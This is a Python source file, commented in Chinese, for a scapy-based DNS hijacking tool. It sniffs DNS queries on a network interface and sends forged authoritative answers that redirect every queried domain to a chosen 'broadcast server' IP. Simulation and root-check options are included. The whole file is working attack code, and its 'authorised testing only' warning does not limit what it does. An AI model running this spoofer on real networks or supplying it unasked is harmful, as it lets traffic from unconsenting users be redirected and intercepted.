#!/usr/bin/env python3
"""
DNS劫持脚本 - 强制所有DNS查询指向广播服务器
⚠️ 仅用于授权测试环境！
"""
from scapy.all import *
import argparse
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# 广播服务器IP
BROADCAST_SERVER = "192.168.1.100"

class DNSHijacker:
    def __init__(self, broadcast_server_ip: str, interface: str = None, simulation_mode: bool = False):
        self.broadcast_server_ip = broadcast_server_ip
        self.interface = interface
        self.simulation_mode = simulation_mode
        self.hijacked_count = 0

    def dns_spoof(self, pkt):
        """拦截DNS查询并返回伪造响应"""
        if pkt.haslayer(DNSQR):
            try:
                queried_domain = pkt[DNSQR].qname.decode()

                if self.simulation_mode:
                    logger.info(f"🎭 [模拟] DNS劫持: {queried_domain} -> {self.broadcast_server_ip}")
                    self.hijacked_count += 1
                    return

                # 构造伪造的DNS响应
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=self.broadcast_server_ip))

                # 发送伪造响应
                send(spoofed_pkt, verbose=0)
                self.hijacked_count += 1
                logger.info(f"🌐 DNS劫持: {queried_domain} -> {self.broadcast_server_ip}")

            except Exception as e:
                logger.error(f"DNS劫持失败: {e}")

    def start(self):
        """启动DNS劫持"""
        logger.warning("=" * 60)
        logger.warning("⚠️  DNS劫持脚本已启动")
        logger.warning(f"目标服务器: {self.broadcast_server_ip}")
        logger.warning(f"模拟模式: {'是' if self.simulation_mode else '否'}")
        logger.warning(f"监听接口: {self.interface or '所有接口'}")
        logger.warning("=" * 60)

        if not self.simulation_mode:
            logger.warning("⚠️⚠️⚠️ 警告：DNS劫持将影响网络流量！⚠️⚠️⚠️")
            logger.warning("按 Ctrl+C 停止劫持")

        try:
            # 嗅探DNS查询（UDP 53端口）
            sniff(
                filter="udp port 53",
                prn=self.dns_spoof,
                iface=self.interface,
                store=0
            )
        except KeyboardInterrupt:
            logger.info(f"\n🛑 DNS劫持已停止 (共劫持 {self.hijacked_count} 个查询)")
        except Exception as e:
            logger.error(f"DNS劫持异常: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='DNS劫持脚本 - 将所有DNS查询重定向到广播服务器',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 模拟模式（不实际发送）
  sudo python3 hijack_dns.py --simulation

  # 正式模式（需要root权限）
  sudo python3 hijack_dns.py --server 192.168.1.100

  # 指定网络接口
  sudo python3 hijack_dns.py --server 192.168.1.100 --interface eth0
        """
    )

    parser.add_argument(
        '--server',
        default='192.168.1.100',
        help='广播服务器IP地址 (默认: 192.168.1.100)'
    )
    parser.add_argument(
        '--interface',
        help='监听的网络接口 (如 eth0, wlan0)'
    )
    parser.add_argument(
        '--simulation',
        action='store_true',
        help='模拟模式：只记录日志，不实际发送伪造DNS响应'
    )

    args = parser.parse_args()

    # 检查root权限
    if not args.simulation and os.geteuid() != 0:
        logger.error("❌ 需要root权限运行此脚本")
        logger.info("请使用: sudo python3 hijack_dns.py")
        sys.exit(1)

    # 启动DNS劫持
    hijacker = DNSHijacker(
        broadcast_server_ip=args.server,
        interface=args.interface,
        simulation_mode=args.simulation
    )
    hijacker.start()


if __name__ == '__main__':
    main()
